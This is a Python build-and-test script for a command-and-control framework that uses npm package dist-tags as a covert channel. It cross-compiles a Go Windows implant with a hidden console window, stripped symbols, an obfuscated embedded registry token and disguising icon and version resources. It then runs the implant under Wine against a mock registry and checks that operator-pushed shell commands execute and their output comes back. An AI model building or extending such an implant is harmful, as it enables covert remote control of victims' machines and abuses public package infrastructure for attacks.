#!/usr/bin/env python3
"""Build the Go implant for Windows and drive it end to end under Wine.

Go cross-compiles from Linux in seconds, so this is the fast path:
    CGO_ENABLED=0 GOOS=windows go build -> node.exe (static, ~7 MB)
"""
import json
import os
import subprocess
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(ROOT, "src"))
sys.path.insert(0, HERE)

import npm_c2
import mock_registry

FAILS = []
PREFIX = os.environ.get("WINEPREFIX", "/home/ika/.wine-py")
WINE = os.environ.get("WINE", "wine")
GO = os.environ.get("GO", "go")


def step(name, ok, detail=""):
    print(f"[{'PASS' if ok else 'FAIL'}] {name}" + (f"  -> {detail}" if detail else ""))
    if not ok:
        FAILS.append(name)


def build(api_base, token, package, outdir, name="node"):
    """Cross-compile the Go implant with the registry URL baked in."""
    go_dir = os.path.join(ROOT, "go")
    api_tmpl = api_base + "/-/package/%s/dist-tags"

    from npm_c2 import obfuscate_token
    emb = obfuscate_token(token, package) if token and package else ""

    # resources: icon + version + manifest
    syso_src = os.path.join(go_dir, "resource", "rsrc_windows_amd64.syso")
    syso_dst = os.path.join(go_dir, "rsrc_windows_amd64.syso")
    if not os.path.exists(syso_src):
        raise SystemExit("missing rsrc_windows_amd64.syso: run windres first")

    ldflags = (f"-s -w -H windowsgui "
               f"-X main.apiTemplate={api_tmpl} "
               f"-X main.embeddedToken={emb}")
    out = os.path.join(outdir, f"{name}.exe")
    env = dict(os.environ, CGO_ENABLED="0", GOOS="windows", GOARCH="amd64")
    p = subprocess.run([GO, "build", "-trimpath", "-ldflags", ldflags, "-o", out, "."],
                       cwd=go_dir, env=env, capture_output=True, text=True)
    if p.returncode != 0:
        sys.stderr.write(p.stdout[-2000:] + p.stderr[-2000:])
        raise SystemExit("go build failed")
    return out


def main():
    reg = mock_registry.Registry()
    srv, base = mock_registry.serve(reg, auth_token="npm_test")
    npm_c2.API = base + "/-/package/{}/dist-tags"
    import npm_c2.implant as im
    import npm_c2.operator as op_mod
    im.API = npm_c2.API
    op_mod.API = npm_c2.API

    outdir = tempfile.mkdtemp()
    pkg = "go/pkg"
    reg.tags.setdefault(pkg, {})["latest"] = "1.0.0"
    print(f"[*] mock registry on {base}")

    t0 = time.time()
    exe = build(base, "npm_test", pkg, outdir)
    build_s = time.time() - t0
    step("cross-compile the Go PE", os.path.exists(exe),
         f"{os.path.getsize(exe)} bytes in {build_s:.1f}s")

    win_marker = "C:\\Py312\\go-marker"
    marker = os.path.join(PREFIX, "drive_c", "Py312", "go-marker")
    if os.path.exists(marker):
        os.remove(marker)

    log_path = os.path.join(outdir, "pe.log")
    env = dict(os.environ, WINEPREFIX=PREFIX, WINEDEBUG="-all")
    with open(log_path, "w") as log:
        proc = subprocess.Popen([WINE, exe, "-p", pkg, "--interval", "5",
                                 "--jitter", "0", "--verbose"],
                                stdout=log, stderr=subprocess.STDOUT, text=True, env=env)
        time.sleep(8)

        from npm_c2.operator import Operator
        op = Operator(pkg, "npm_test")
        op.push_task(f"echo go-ok > {win_marker}")
        op.push_task("echo hello-from-go")

        # Wait for BOTH effects: the file on disk and the reply on the channel.
        # Killing the PE as soon as the marker appears truncates the second
        # command mid-flight and looks like a failed write-back.
        deadline = time.time() + 60
        decoded = b""
        while time.time() < deadline:
            results = [t for t in reg.snapshot(pkg) if t.startswith(npm_c2.RES_PREFIX)]
            decoded = b"".join(npm_c2.decode_tag(t)["data"] for t in results) if results else b""
            if os.path.exists(marker) and b"hello-from-go" in decoded:
                break
            time.sleep(1)
        results = [t for t in reg.snapshot(pkg) if t.startswith(npm_c2.RES_PREFIX)]
        proc.terminate()
        try:
            proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=10)

    out = open(log_path, errors="replace").read()
    step("the Go PE executes a command", os.path.exists(marker),
         "marker written" if os.path.exists(marker) else "no marker")
    step("the Go PE writes its reply back", b"hello-from-go" in decoded,
         f"{len(results)} tag(s): {decoded[:60]!r}")
    if out.strip():
        step("the Go PE logged a cycle", "cmd:" in out or "poll" in out,
             out.strip().splitlines()[-1][:70])

    srv.shutdown()
    print(f"\n{'the Go Windows build works on the channel' if not FAILS else 'failing: ' + ', '.join(FAILS)}")
    return 1 if FAILS else 0


if __name__ == "__main__":
    sys.exit(main())
